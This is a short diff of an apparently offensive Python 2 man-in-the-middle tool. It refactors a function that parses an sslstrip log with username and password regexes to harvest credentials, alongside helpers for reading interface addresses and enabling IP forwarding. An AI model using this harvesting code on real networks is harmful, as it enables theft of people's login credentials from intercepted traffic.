@@ -60,7 +60,7 @@ def get_myip(interface):
     )[20:24])
 
 
-def credentials(users,passwords):
+def credentials(users, passwords):
     if users:
         for u in users:
             print "[$] Login found: {}".format(str(u[1]))
@@ -77,21 +77,16 @@ user_regex = '([Ee]mail|[Uu]ser|[Uu]sr|[Uu]sername|[Nn]ame|[Ll]ogin|[Ll]og|[Ll]o
 pw_regex = '([Pp]assword|[Pp]ass|[Pp]wd|[Pp]asswd|[Pp]wd|[Pp][Ss][Ww]|[Pp]asswrd|[Pp]assw)=([^&|;]*)'
 
 
-def credentials_harvest(file):
-    path = os.getcwd()
-    if file is None:
-        file = path + "/sslstrip.log"
-    else:
-        file = path + "/" + file
-        print "[$] Credential Harvester:"
-        #try:
-        f = open(file,"r+")
+def credentials_harvest(file = 'sslstrip.log'):
+    file = os.path.join(os.getcwd(), file)
+    print "[$] Credential Harvester:"
+
+    with open(file,"r+") as f:
         content = f.read().replace('\n','')
-        #except:
-                #print "[!] Problem reading the sslstrip log"
-        users = re.findall(user_regex, content)
-        passwords = re.findall(pw_regex, content)
-        credentials(users,passwords)
+
+    users = re.findall(user_regex, content)
+    passwords = re.findall(pw_regex, content)
+    credentials(users, passwords)
 
 
 def get_mymac(interface):
@@ -103,7 +98,6 @@ def get_mymac(interface):
 def set_ip_forwarding(value):
     with open('/proc/sys/net/ipv4/ip_forward', 'w') as file:
         file.write(str(value))
-        file.close()
         print "[*] Setting the packet forwarding."
 
 
